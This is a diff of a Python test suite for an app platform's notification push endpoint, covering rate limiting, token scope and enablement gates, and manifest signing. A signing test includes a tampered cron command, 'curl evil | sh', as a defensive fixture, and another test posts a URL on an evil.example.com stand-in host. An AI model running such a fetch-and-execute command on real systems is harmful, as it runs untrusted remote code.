@@ -117,9 +117,7 @@ class TestAppRateLimiter:
     def test_tokens_refill_over_time(self, monkeypatch):
         limiter = AppRateLimiter()
         now = [1000.0]
-        monkeypatch.setattr(
-            "kiro_crew.notifications.rate_limit.time.monotonic", lambda: now[0]
-        )
+        monkeypatch.setattr("kiro_crew.notifications.rate_limit.time.monotonic", lambda: now[0])
         for _ in range(RATE_LIMIT_BURST):
             assert limiter.allow("app-a")
         assert not limiter.allow("app-a")
@@ -148,6 +146,9 @@ class TestAppRateLimiter:
 
 class TestAppTokenPathGrant:
     def test_push_path_allowed_for_app_tokens(self):
+        # `app_token_path_allowed` is a pure SCOPE predicate: enablement is NOT
+        # its concern (it is enforced at request time by `_enforce_app_scope`),
+        # so no enablement patch is needed here.
         assert app_token_path_allowed("some-app", "/api/notifications/push")
 
     def test_notification_read_path_still_denied(self):
@@ -155,6 +156,33 @@ class TestAppTokenPathGrant:
 
     def test_empty_app_name_denied(self):
         assert not app_token_path_allowed("", "/api/notifications/push")
+
+    def test_a_disabled_app_is_denied_even_a_granted_path(self):
+        # Enablement is enforced at the REQUEST-TIME gate, not in the scope
+        # predicate. The predicate still grants the push path to any app (scope
+        # question), but `_enforce_app_scope` refuses a disabled app before the
+        # scope hop. `is_app_enabled` is the fail-closed door seam: disabled, not
+        # installed and unreadable all collapse to False.
+        import asyncio as _asyncio
+        from unittest import mock
+
+        from kiro_crew.dashboard import token_auth as _ta
+
+        # The predicate, being enablement-agnostic, grants the granted path.
+        assert app_token_path_allowed("some-app", "/api/notifications/push")
+
+        # The request-time gate refuses the disabled app on that same path.
+        req = mock.MagicMock()
+        req.headers = {}
+        with mock.patch("kiro_crew.apps.permissions.is_app_enabled", lambda name: False):
+            with mock.patch.object(_ta, "warm_app_scope", mock.AsyncMock(return_value=None)):
+                with mock.patch.object(_ta, "_sel_fn", lambda: mock.MagicMock()):
+                    with mock.patch.object(_ta, "_log_auth", lambda *a, **k: None):
+                        with mock.patch.object(_ta, "_deny", lambda request, msg: "DENIED"):
+                            resp = _asyncio.run(
+                                _ta._enforce_app_scope(req, "some-app", "/api/notifications/push")
+                            )
+        assert resp == "DENIED"
 
 
 # ── Push handler ──
@@ -442,9 +470,12 @@ class TestPushHandler:
         # would race loop-side writers).
         from kiro_crew.dashboard.handlers.notifications_push import _resolve_app_channels
 
-        with patch("kiro_crew.apps.manager.get_app") as get_app_mock, patch(
-            "kiro_crew.dashboard.handlers.notifications_push.is_app_enabled",
-            return_value=False,
+        with (
+            patch("kiro_crew.apps.manager.get_app") as get_app_mock,
+            patch(
+                "kiro_crew.dashboard.handlers.notifications_push.is_app_enabled",
+                return_value=False,
+            ),
         ):
             assert _resolve_app_channels("some-app") is None
         get_app_mock.assert_not_called()
@@ -454,9 +485,7 @@ class TestPushHandler:
         # Every denial path must emit a SEL audit event, including the
         # no-app-token 403.
         state = _FakeState()
-        with patch(
-            "kiro_crew.dashboard.handlers.notifications_push.sel"
-        ) as sel_mock:
+        with patch("kiro_crew.dashboard.handlers.notifications_push.sel") as sel_mock:
             async with TestClient(TestServer(_make_app(state, {"app": ""}))) as client:
                 resp = await client.post(
                     "/api/notifications/push",
@@ -478,8 +507,12 @@ class TestPushHandler:
                 for _ in range(RATE_LIMIT_BURST + 3):
                     resp = await client.post(
                         "/api/notifications/push",
-                        json={"channel": "ticket-update", "title": "t", "body": "b",
-                              "url": "https://evil.example.com/"},
+                        json={
+                            "channel": "ticket-update",
+                            "title": "t",
+                            "body": "b",
+                            "url": "https://evil.example.com/",
+                        },
                     )
                     assert resp.status == 400
                 # Budget untouched: a valid push still succeeds.
@@ -568,9 +601,10 @@ class TestPushHandler:
             raise OSError("disk full")
 
         state.notification_bus = NotificationBus(sink=exploding_sink)
-        with _patch_channels(), patch(
-            "kiro_crew.dashboard.handlers.notifications_push.sel"
-        ) as sel_mock:
+        with (
+            _patch_channels(),
+            patch("kiro_crew.dashboard.handlers.notifications_push.sel") as sel_mock,
+        ):
             async with TestClient(TestServer(_make_app(state, {"app": "oncall-radar"}))) as client:
                 resp = await client.post(
                     "/api/notifications/push",
@@ -579,7 +613,9 @@ class TestPushHandler:
                 body = await resp.json()
         assert resp.status == 500
         assert body["error"] == "notification delivery failed"
-        outcomes = [c.kwargs.get("outcome") for c in sel_mock.return_value.log_api_access.call_args_list]
+        outcomes = [
+            c.kwargs.get("outcome") for c in sel_mock.return_value.log_api_access.call_args_list
+        ]
         assert "error" in outcomes
 
 
@@ -598,9 +634,10 @@ class TestPushDurability:
             state.last_notification_persist = fut
 
         state.notification_bus = NotificationBus(sink=failing_sink)
-        with _patch_channels(), patch(
-            "kiro_crew.dashboard.handlers.notifications_push.sel"
-        ) as sel_mock:
+        with (
+            _patch_channels(),
+            patch("kiro_crew.dashboard.handlers.notifications_push.sel") as sel_mock,
+        ):
             async with TestClient(TestServer(_make_app(state, {"app": "oncall-radar"}))) as client:
                 resp = await client.post(
                     "/api/notifications/push",
@@ -610,8 +647,7 @@ class TestPushDurability:
         assert resp.status == 500
         assert body["error"] == "notification persistence failed"
         outcomes = [
-            c.kwargs.get("outcome")
-            for c in sel_mock.return_value.log_api_access.call_args_list
+            c.kwargs.get("outcome") for c in sel_mock.return_value.log_api_access.call_args_list
         ]
         assert "error" in outcomes
 
@@ -663,15 +699,19 @@ class TestSigningPayloadCoversNotifications:
         # critical) must invalidate the admission signature.
         base = AppManifest(name="a", version="1.0.0")
         signed = AppManifest(
-            name="a", version="1.0.0",
+            name="a",
+            version="1.0.0",
             notifications=NotificationsConfig(
                 channels=[NotificationChannel(id="alerts", name="Alerts")]
             ),
         )
         tampered = AppManifest(
-            name="a", version="1.0.0",
+            name="a",
+            version="1.0.0",
             notifications=NotificationsConfig(
-                channels=[NotificationChannel(id="alerts", name="Alerts", defaultPriority="critical")]
+                channels=[
+                    NotificationChannel(id="alerts", name="Alerts", defaultPriority="critical")
+                ]
             ),
         )
         assert signed.signing_payload() != base.signing_payload()
@@ -700,12 +740,13 @@ class TestReservedAppName:
         (pre-rule install or a validation bypass), it cannot push into the
         system.* channel namespace -- 403, not a shadowed system.approval."""
         state = _FakeState()
-        with patch(
-            "kiro_crew.dashboard.handlers.notifications_push.is_app_enabled",
-            return_value=True,
-        ), patch(
-            "kiro_crew.dashboard.handlers.notifications_push.get_app_manifest"
-        ) as gm:
+        with (
+            patch(
+                "kiro_crew.dashboard.handlers.notifications_push.is_app_enabled",
+                return_value=True,
+            ),
+            patch("kiro_crew.dashboard.handlers.notifications_push.get_app_manifest") as gm,
+        ):
             async with TestClient(TestServer(_make_app(state, {"app": "system"}))) as client:
                 resp = await client.post(
                     "/api/notifications/push",
@@ -799,11 +840,13 @@ class TestSigningPayloadCoversCrons:
         # what runs; only the signature authenticates publisher intent.
         base = AppManifest(name="a", version="1.0.0")
         signed = AppManifest(
-            name="a", version="1.0.0",
+            name="a",
+            version="1.0.0",
             crons=[CronEntry(name="sync", every=3600, command="echo hi")],
         )
         tampered = AppManifest(
-            name="a", version="1.0.0",
+            name="a",
+            version="1.0.0",
             crons=[CronEntry(name="sync", every=3600, command="curl evil | sh")],
         )
         assert signed.signing_payload() != base.signing_payload()
@@ -811,15 +854,18 @@ class TestSigningPayloadCoversCrons:
 
     def test_script_and_env_tamper_changes_signing_payload(self):
         signed = AppManifest(
-            name="a", version="1.0.0",
+            name="a",
+            version="1.0.0",
             crons=[CronEntry(name="j", every=60, script="task.py:run")],
         )
         tampered_script = AppManifest(
-            name="a", version="1.0.0",
+            name="a",
+            version="1.0.0",
             crons=[CronEntry(name="j", every=60, script="evil.py:run")],
         )
         tampered_env = AppManifest(
-            name="a", version="1.0.0",
+            name="a",
+            version="1.0.0",
             crons=[CronEntry(name="j", every=60, script="task.py:run", env={"X": "1"})],
         )
         assert tampered_script.signing_payload() != signed.signing_payload()
@@ -969,9 +1015,7 @@ class TestPushErrorCodes:
         for node in ast.walk(tree):
             if not isinstance(node, ast.Call):
                 continue
-            status = next(
-                (kw.value for kw in node.keywords if kw.arg == "status"), None
-            )
+            status = next((kw.value for kw in node.keywords if kw.arg == "status"), None)
             if not isinstance(status, ast.Constant) or not isinstance(status.value, int):
                 continue
             if status.value < 400 or not node.args:
